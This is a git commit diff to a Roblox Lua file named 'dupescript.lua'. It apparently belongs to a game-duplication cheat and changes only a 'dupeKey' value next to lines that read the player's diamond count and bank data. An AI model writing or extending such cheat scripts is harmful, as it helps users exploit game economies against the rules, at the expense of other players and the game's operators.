d4e86bce1ca0d6dde6d3ab711130fd441d205023
fikury <99775465+fikury@users.noreply.github.com>
2022-03-05 12:50:53 +0700

    Update dupescript.lua

--- dupescript.lua
+++ dupescript.lua
@@ -1,4 +1,4 @@
-local dupeKey = 2294800504
+local dupeKey = 2665905017
 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
 local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
 local mybanks = lib.Network.Invoke("get my banks")
